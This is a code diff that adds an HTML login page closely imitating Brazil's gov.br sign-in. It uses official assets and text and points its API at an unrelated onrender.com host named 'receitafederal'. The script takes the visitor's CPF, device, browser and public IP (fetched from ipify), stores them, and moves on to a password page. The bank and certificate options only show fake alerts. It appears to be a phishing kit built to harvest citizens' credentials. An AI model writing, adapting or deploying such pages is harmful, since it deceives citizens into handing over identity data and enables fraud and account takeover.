@@ -1,0 +1,251 @@
+<!-- index.html - Página de login do gov.br -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>gov.br - Acesse sua conta</title>
+    <link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
+    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-templates.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Rawline', sans-serif; background: #f5f5f5; }
+        header { background: #fff; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
+        header img { height: 40px; }
+        #acessibilidade span { margin-left: 1rem; }
+        #acessibilidade a { color: #333; text-decoration: none; font-size: 14px; }
+        .container { display: flex; max-width: 1200px; margin: 2rem auto; background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        aside { flex: 1; background: linear-gradient(135deg, #1351B4 0%, #0c326f 100%); padding: 3rem; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center; }
+        aside img { max-width: 200px; margin-bottom: 2rem; }
+        aside p { font-size: 1.2rem; line-height: 1.6; }
+        main { flex: 1; padding: 3rem; }
+        .card { margin-bottom: 2rem; }
+        h3 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #1351B4; }
+        .item-login { border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 0.5rem; overflow: hidden; }
+        .item-login > a, .item-login > button { display: flex; align-items: center; gap: 1rem; padding: 1rem; text-decoration: none; color: #333; font-weight: 500; width: 100%; background: #fff; border: none; cursor: pointer; font-size: 1rem; text-align: left; }
+        .item-login > a:hover, .item-login > button:hover { background: #f0f4fa; }
+        .item-login img { width: 24px; height: 24px; }
+        .accordion-panel { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding: 0 1rem; }
+        .accordion-panel.open { max-height: 300px; padding: 1rem; }
+        label { display: block; font-weight: 500; margin-bottom: 0.5rem; color: #555; }
+        input { width: 100%; padding: 0.75rem; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
+        input:focus { outline: none; border-color: #1351B4; box-shadow: 0 0 0 2px rgba(19,81,180,0.2); }
+        .button-panel { display: flex; gap: 1rem; margin-top: 1.5rem; }
+        .button-continuar { background: #1351B4; color: #fff; border: none; padding: 0.75rem 2rem; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 1rem; }
+        .button-continuar:hover { background: #0c326f; }
+        .button-continuar:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-outline { background: transparent; border: 1px solid #1351B4; color: #1351B4; padding: 0.75rem 2rem; border-radius: 8px; cursor: pointer; }
+        .hr-text { display: flex; align-items: center; text-align: center; margin: 1.5rem 0; color: #888; font-size: 0.85rem; }
+        .hr-text::before, .hr-text::after { content: ''; flex: 1; border-bottom: 1px solid #ddd; }
+        .hr-text::before { margin-right: 1rem; }
+        .hr-text::after { margin-left: 1rem; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: #fff; border-radius: 12px; padding: 2rem; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; }
+        .modal-content h3 { margin-top: 0; }
+        .modal-providers-list { margin: 1rem 0; }
+        .modal-providers-list .item-login { margin-bottom: 0.5rem; }
+        .button-cancel { background: #f5f5f5; border: 1px solid #ccc; padding: 0.6rem 1.5rem; border-radius: 8px; cursor: pointer; }
+        .entenda-id-govbr { margin-top: 2rem; padding-top: 1rem; border-top: 1px solid #eee; }
+        .entenda-id-govbr a { color: #1351B4; text-decoration: none; display: block; margin-bottom: 0.5rem; }
+        .badge-prata { background: #008C32; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 12px; margin-left: 8px; }
+        @media (max-width: 768px) { .container { flex-direction: column; margin: 1rem; } aside { padding: 2rem; } }
+    </style>
+</head>
+<body>
+    <a href="#conteudo" class="sr-only">Pular para o conteúdo principal</a>
+    <header>
+        <a href="https://www.gov.br/"><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="gov.br"></a>
+        <div id="acessibilidade">
+            <span><a href="#" id="contrast-btn"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a></span>
+            <span><a href="https://www.vlibras.gov.br/" target="_blank"><i class="fas fa-deaf"></i><span>VLibras</span></a></span>
+        </div>
+    </header>
+
+    <div class="container">
+        <aside>
+            <img src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Conta gov.br">
+            <p>A conta de acesso do governo federal<br>para milhões de serviços</p>
+        </aside>
+        <main id="conteudo">
+            <div class="card">
+                <h3>Identifique-se no gov.br com:</h3>
+                
+                <div class="item-login" onclick="toggleAccordion()">
+                    <a href="#"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png"> Número do CPF</a>
+                </div>
+                <div id="cpf-accordion" class="accordion-panel">
+                    <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+                    <label for="cpf">CPF</label>
+                    <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                    <div class="button-panel">
+                        <button id="btn-continuar" class="button-continuar">Continuar</button>
+                    </div>
+                </div>
+
+                <div class="hr-text">ou</div>
+
+                <div class="item-login" onclick="showModal('bancos-modal')">
+                    <button type="button" class="btn-outline" style="width:100%; justify-content:flex-start;"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png"> Login com seu banco <span class="badge-prata">CONTA PRATA</span></button>
+                </div>
+
+                <div class="item-login" onclick="showModal('qrcode-modal')">
+                    <a href="#"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/qrcode.png"> Login com QR code</a>
+                </div>
+
+                <div class="item-login">
+                    <button id="cert-digital-btn" type="button" class="btn-outline" style="width:100%; justify-content:flex-start;"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png"> Seu certificado digital</button>
+                </div>
+
+                <div class="entenda-id-govbr">
+                    <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br" target="_blank"><img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" style="width:16px; margin-right:8px;"> Está com dúvidas e precisa de ajuda?</a>
+                    <a href="https://cadastro.acesso.gov.br/termo-de-uso" target="_blank">Termo de Uso e Aviso de Privacidade</a>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Modal Bancos -->
+    <div id="bancos-modal" class="modal">
+        <div class="modal-content">
+            <h3>Bancos Credenciados</h3>
+            <p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>, fazendo login com seu banco.</p>
+            <div class="modal-providers-list">
+                <div class="item-login"><button class="banco-btn" data-banco="bb"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/bb_logo.png"> Banco do Brasil</button></div>
+                <div class="item-login"><button class="banco-btn" data-banco="itau"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/itau_logo.png"> Itaú</button></div>
+                <div class="item-login"><button class="banco-btn" data-banco="caixa"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/cef_logo.png"> Caixa Econômica</button></div>
+                <div class="item-login"><button class="banco-btn" data-banco="bradesco"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/bradesco_logo.png"> Bradesco</button></div>
+                <div class="item-login"><button class="banco-btn" data-banco="santander"><img src="https://sso.acesso.gov.br/assets/govbr/img/icons/santander_logo.png"> Santander</button></div>
+            </div>
+            <hr>
+            <div class="button-panel"><button class="button-cancel" onclick="closeModal('bancos-modal')">Cancelar</button></div>
+        </div>
+    </div>
+
+    <!-- Modal QR Code -->
+    <div id="qrcode-modal" class="modal">
+        <div class="modal-content" style="text-align: center;">
+            <h3>Login sem senha com QR code</h3>
+            <p>Utilize o <strong>aplicativo gov.br</strong> para logar sem senha, usando apenas o leitor de QR code.</p>
+            <div id="qrcode" style="display: inline-block; margin: 1rem 0;"></div>
+            <p>Baixe o aplicativo <strong>gov.br</strong> gratuitamente:</p>
+            <p><a href="https://play.google.com/store/apps/details?id=br.gov.meugovbr"><img src="https://sso.acesso.gov.br/assets/govbr/img/disponivel-no-google-play.png" style="width:125px;"></a> <a href="https://apps.apple.com/br/app/meu-gov-br/id1506827551"><img src="https://sso.acesso.gov.br/assets/govbr/img/disponivel-na-apple-store.png" style="width:125px;"></a></p>
+            <div class="button-panel"><button class="button-cancel" onclick="closeModal('qrcode-modal')">Cancelar</button></div>
+        </div>
+    </div>
+
+    <script src="https://sso.acesso.gov.br/assets/vendors/qrcode/qrcode.min.js"></script>
+    <script>
+        // Configuração
+        const API_URL = window.location.origin.includes('localhost') ? 'http://localhost:3001/api' : 'https://receitafederal-f2fk.onrender.com/api';
+        
+        // Elementos
+        const cpfInput = document.getElementById('cpf');
+        const btnContinuar = document.getElementById('btn-continuar');
+        
+        // Formatação do CPF
+        cpfInput?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            if (value.length >= 4) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            if (value.length >= 8) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            if (value.length >= 11) value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            e.target.value = value;
+        });
+        
+        // Alternar accordion
+        function toggleAccordion() {
+            const panel = document.getElementById('cpf-accordion');
+            panel.classList.toggle('open');
+        }
+        
+        // Continuar - validar CPF e enviar
+        async function continuarLogin() {
+            const cpf = cpfInput?.value.replace(/\D/g, '');
+            if (!cpf || cpf.length !== 11) {
+                alert('Digite um CPF válido com 11 dígitos');
+                return;
+            }
+            
+            btnContinuar.disabled = true;
+            btnContinuar.textContent = 'Verificando...';
+            
+            // Coletar dados do dispositivo
+            const userAgent = navigator.userAgent;
+            let dispositivo = 'Desktop';
+            let navegador = 'Desconhecido';
+            
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'Mobile';
+            else if (/Tablet|iPad/i.test(userAgent)) dispositivo = 'Tablet';
+            if (userAgent.indexOf('Chrome') > -1) navegador = 'Chrome';
+            else if (userAgent.indexOf('Firefox') > -1) navegador = 'Firefox';
+            else if (userAgent.indexOf('Safari') > -1) navegador = 'Safari';
+            else if (userAgent.indexOf('Edge') > -1) navegador = 'Edge';
+            
+            localStorage.setItem('login_cpf', cpf);
+            localStorage.setItem('login_dispositivo', dispositivo);
+            localStorage.setItem('login_navegador', navegador);
+            
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                localStorage.setItem('login_ip', ipData.ip);
+            } catch(e) {
+                localStorage.setItem('login_ip', 'Não coletado');
+            }
+            
+            window.location.href = '/password.html';
+        }
+        
+        btnContinuar?.addEventListener('click', continuarLogin);
+        cpfInput?.addEventListener('keypress', function(e) { if (e.key === 'Enter') continuarLogin(); });
+        
+        // Modal functions
+        window.showModal = function(id) {
+            document.getElementById(id).style.display = 'flex';
+            if (id === 'qrcode-modal') gerarQRCode();
+        };
+        window.closeModal = function(id) {
+            document.getElementById(id).style.display = 'none';
+        };
+        
+        function gerarQRCode() {
+            const qrcodeDiv = document.getElementById('qrcode');
+            if (qrcodeDiv && typeof QRCode !== 'undefined') {
+                qrcodeDiv.innerHTML = '';
+                new QRCode(qrcodeDiv, { text: window.location.href, width: 200, height: 200 });
+            }
+        }
+        
+        // Contraste
+        document.getElementById('contrast-btn')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.body.classList.toggle('high-contrast');
+            if (document.body.classList.contains('high-contrast')) {
+                document.body.style.background = '#000';
+                document.body.style.color = '#fff';
+            } else {
+                document.body.style.background = '';
+                document.body.style.color = '';
+            }
+        });
+        
+        // Bancos
+        document.querySelectorAll('.banco-btn').forEach(btn => {
+            btn.addEventListener('click', () => alert('Redirecionando para o banco...\n(Integração com banco em desenvolvimento)'));
+        });
+        
+        document.getElementById('cert-digital-btn')?.addEventListener('click', () => alert('Certificado digital não encontrado.\nConecte seu token ou smartcard.'));
+        
+        // Inicializar QR Code
+        if (typeof QRCode !== 'undefined') setTimeout(() => { if(document.getElementById('qrcode')) new QRCode(document.getElementById('qrcode'), { text: window.location.href, width: 200, height: 200 }); }, 100);
+        
+        // Abrir accordion se houver erro
+        if (sessionStorage.getItem('show_cpf')) {
+            document.getElementById('cpf-accordion')?.classList.add('open');
+            sessionStorage.removeItem('show_cpf');
+        }
+    </script>
+</body>
+</html>
